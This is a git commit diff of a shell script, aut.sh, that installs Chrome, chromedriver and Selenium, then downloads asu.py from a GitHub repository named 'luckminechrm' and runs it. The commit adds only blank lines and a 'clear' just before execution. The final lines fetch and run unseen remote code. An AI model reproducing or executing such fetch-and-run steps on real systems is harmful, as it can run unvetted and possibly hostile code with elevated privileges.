d497f106ead169934ad5bb012c27c6b8889bcd25
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-07-17 21:36:58 +0700

    Update aut.sh

--- aut.sh
+++ aut.sh
@@ -3,7 +3,9 @@ wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
 dpkg -i google-chrome-stable_current_amd64.deb
 apt-get install -f -y
 wget https://storage.googleapis.com/chrome-for-testing-public/126.0.6478.182/linux64/chromedriver-linux64.zip
+
 unzip chromedriver-linux64.zip
+
 sudo mv chromedriver /usr/bin/chromedriver
 sudo chown root:root /usr/bin/chromedriver
 sudo chmod +x /usr/bin/chromedriver
@@ -11,4 +13,6 @@ apt install python3 -y
 apt install pip3 -y
 pip3 install selenium
 wget https://raw.githubusercontent.com/monhodsompul/luckminechrm/main/asu.py
+
+clear
 python3 asu.py
